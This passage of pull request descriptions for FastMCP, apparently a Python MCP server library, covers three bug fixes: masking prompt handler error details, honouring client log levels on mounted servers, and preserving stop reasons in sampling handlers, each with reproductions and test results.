    await client.call_tool("calc", {"x": 1}, version="1.0")  # before: 1; now: Unknown tool
```

Closes #6357

title: fix(prompts): mask prompt handler errors when `mask_error_details` is on
body:
## Why

With `mask_error_details=True`, a tool handler's message is masked but a prompt handler's is not:

```python
mcp = FastMCP("demo", mask_error_details=True)

@mcp.prompt
def render(topic: str) -> str:
    raise RuntimeError("INTERNAL_DETAIL")

# client.get_prompt("render", {"topic": "x"})
# before: MCPError -32603 "Error rendering prompt 'render': INTERNAL_DETAIL"
# after : MCPError -32603 "Error rendering prompt 'render'"
```

`FunctionPrompt.render` wraps any handler failure into a `PromptError` that carries the original message, and `PromptError` is a `FastMCPError`. `render_prompt`'s `except FastMCPError` branch re-raised it untouched, so the generic branch -- the only place masking happens -- never ran.

## What changed

- `server/server.py`: `render_prompt` handles `PromptError` before `FastMCPError` -- masked when `mask_error_details` is on, re-raised unchanged otherwise.
- `tests/prompts/test_prompt.py`: two tests, one per masking mode, so the unmasked path is pinned as well.

## Testing

- `pytest tests/prompts/test_prompt.py`: 66 passed.
- `test_handler_error_is_masked` fails with the source hunk stashed and passes with it applied; `test_handler_error_keeps_the_message_when_not_masking` passes either way, as it should.
- `ruff format --check` clean on both files.

Fixes #6273

title: fix(logging): apply `logging/setLevel` to tools on mounted servers
body:
## Why

A client mounts-free server behaves; a mounted one does not.

`logging/setLevel` is handled by the server the request arrived at, so the level lands in **that** instance's `_client_log_levels`. A tool on a mounted server runs against the child `FastMCP` instance, and `Context.log` reads `self.fastmcp._client_log_levels` -- the child's, which never received the request. It falls back to the server-wide `client_log_level` and the client keeps getting messages it asked not to receive.

Minimal reproduction over a stateful transport (in-memory does not show it):

```python
child = FastMCP("child")

@child.tool
async def say(ctx: Context) -> str:
    await ctx.log("an info message", level="info")
    await ctx.log("an error message", level="error")
    return "done"

parent = FastMCP("parent")
parent.mount(child)

# client sends logging/setLevel=warning, then calls say
# before: child ['error'] / parent ['info', 'error']
# after : child ['error'] / parent ['error']
```

## What changed

- `server/mixins/mcp_operations.py`: the handler mirrors the level into the connection state (`CLIENT_LOG_LEVEL_STATE_KEY`) in addition to the per-instance dict, and registers the pop on the same connection cleanup it already used.
- `server/context.py`: `Context.log` prefers the connection state and falls back to the per-instance dict, which keeps the stdio path (no connection session id) working exactly as before.
- `tests/client/test_logs.py`: regression test using `asgi_client` -- the mounted tool now honours the client's level.

## Testing

- `tests/client/test_logs.py`: 15 passed. `tests/server/test_protocol_eras.py` + `tests/client/test_logs.py`: 70 passed. `tests/server/mount` (minus `test_advanced.py`, which fails to collect in this environment for an unrelated missing dependency): 171 passed.
- The new test fails with the source hunks stashed and passes with them applied.
- `ruff format --check` clean on the touched files.

Fixes #6299

title: fix(sampling): keep the stop reason when no tools are offered
body:
## Why

The Anthropic, OpenAI and Google GenAI sampling handlers map the provider's stop reason to MCP's only in the `*_with_tools` converters. A request that offered no tools went through the no-tool converter, which returned a `CreateMessageResult` with no `stopReason` at all -- so a reply cut off at `max_tokens` came back looking exactly like a finished one, and the server that asked for the sample could not tell it had been truncated.

## What changed

- `client/sampling/handlers/anthropic.py`: new `_stop_reason_from_message()`; both `_message_to_create_message_result` and `_message_to_result_with_tools` use it.
- `client/sampling/handlers/openai.py`: same, via `_stop_reason_from_finish_reason()`.
- `client/sampling/handlers/google_genai.py`: same, via a module-level `_stop_reason_from_finish_reason()` (the tool converter still prefers `toolUse` when the candidate carries function calls).

Each handler keeps its own mapping because the provider vocabularies differ, but the mapping now has one definition per handler instead of two copies that could drift.

## Testing

- `pytest tests/client/sampling/handlers`: 80 passed, 8 failed. The 8 failures are `test_convert_*` / `test_handler_preserves_temperature_on_the_wire` in `test_anthropic_handler.py` and fail identically on unmodified `main` in this environment (`TypeError: Cannot instantiate typing.Union` from the installed `anthropic` SDK) -- unrelated to this change.
- New tests: `test_message_to_create_message_result_maps_stop_reason` (4 params), `test_chat_completion_to_create_message_result_keeps_max_tokens`, `test_response_to_create_message_result_keeps_max_tokens`. All 13 tests in that area fail with the source hunks stashed and pass with them applied.
- Two existing expectations were updated because they encoded the bug (`stop_reason` absent from the no-tool result).
- `ruff format --check` clean; `ruff check` reports only pre-existing `TRY004` hits in untouched lines.

Fixes #6341
